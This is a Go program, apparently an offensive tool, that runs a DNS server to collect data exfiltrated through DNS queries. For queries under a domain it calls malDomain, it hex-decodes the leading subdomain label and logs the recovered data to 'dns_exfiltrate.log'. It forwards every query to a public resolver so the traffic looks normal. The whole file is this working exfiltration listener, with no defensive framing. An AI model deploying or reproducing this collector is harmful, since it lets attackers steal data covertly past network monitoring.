package main

import (
	"encoding/hex"
	"fmt"
	"os"
	"strings"

	"github.com/miekg/dns"
)

type dnsHandler struct{}

const (
	malDomain   string = "example.com"
	logFileName string = "dns_exfiltrate.log"
)

func resolve(domain string, qtype uint16) *dns.Msg {
	msg := new(dns.Msg)
	msg.SetQuestion(dns.Fqdn(domain), qtype)
	msg.RecursionDesired = true

	c := new(dns.Client)
	in, _, err := c.Exchange(msg, "8.8.8.8:53") // use Google DNS to get answers
	if err != nil {
		fmt.Println(err)
		return nil
	}
	return in
}

func hexDecode(subdomain string) {
	data := make([]byte, hex.DecodedLen(len(subdomain)))
	_, err := hex.Decode(data, []byte(subdomain))
	if err != nil {
		return
	} else {
		fmt.Println("data:", string(data))
		writeToFile(data)
	}

}

func writeToFile(data []byte) {
	f, err := os.OpenFile(logFileName, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		panic(err)
	}
	defer f.Close()
	if _, err = f.Write(data); err != nil {
		panic(err)
	}

}

func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true

	for _, question := range r.Question {
		fmt.Printf("Received query: %s\n", question.Name)
		// get subdomain to exfiltrate data
		d := strings.Split(question.Name, ".")
		domain := d[len(d)-3] + "." + d[len(d)-2]
		if domain == malDomain {
			hexDecode(d[0])
		}
		id := msg.Id // set original ID
		// resolve real domains
		msg = resolve(question.Name, question.Qtype)
		msg.Id = id

	}

	w.WriteMsg(msg)
}

func main() {
	handler := new(dnsHandler)
	server := &dns.Server{
		Addr:      ":53",
		Net:       "udp",
		Handler:   handler,
		UDPSize:   65535,
		ReusePort: true,
	}

	fmt.Println("Starting DNS server on port 53")
	err := server.ListenAndServe()
	if err != nil {
		fmt.Printf("Failed to start server: %s\n", err.Error())
	}
}
